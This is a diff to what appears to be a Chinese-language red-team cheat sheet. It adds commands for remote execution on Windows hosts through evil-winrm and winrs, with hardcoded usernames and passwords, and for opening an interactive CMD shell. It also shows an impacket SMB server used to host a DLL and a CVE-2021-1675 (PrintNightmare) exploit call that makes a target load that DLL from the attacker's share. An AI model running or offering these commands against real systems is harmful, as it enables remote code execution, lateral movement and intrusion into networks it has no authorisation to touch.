@@ -915,6 +915,20 @@ http_proxy=http://192.168.50.161:2080/
 
 允许 IP: ID 右侧三个点 -> 允许 IP 直连
 
+
+## evil-winrm 远程命令执行/ssh
+[Link](https://mp.weixin.qq.com/s/fSkygmxijKk70qJ32Ay83g)
+
+```sh
+evil-winrm -i 172.16.1.10 -u backup_svc -p 'Makemoney1!' 
+# win自带命令 winrs
+## 远程执行命令
+winrs -r:http://192.168.2.153:5985 -u:desktop-r3kfb05\hacker -p:qwe123.. "ipconfig"
+## 打开CMD交互
+winrs -r:http://192.168.1.20 -u:用户名 -p:密码 cmd
+
+```
+
 # other
 
 [防封 ip 解决方案之 ip 代理池](https://mp.weixin.qq.com/s/jteH4KuRoSW6ozIwNm9NPg)
@@ -1004,6 +1018,13 @@ sc start gupdate
 | psexec.py  | impacket-psexec  |
 | smbexec.py | impacket-smbexec |
 |            |                  |
+## impacket/smb-server
+
+```sh
+# 本机启动smb, 可通过 IP\smb 访问本机目录
+impacket-smbserver smb /tmp/
+python3 CVE-2021-1675.py hacker.test/win10:ShiJinBuShi@192.168.110.110 '\\192.168.110.132\smb\sjbs.dll'
+```
 
 ## mstsc
 
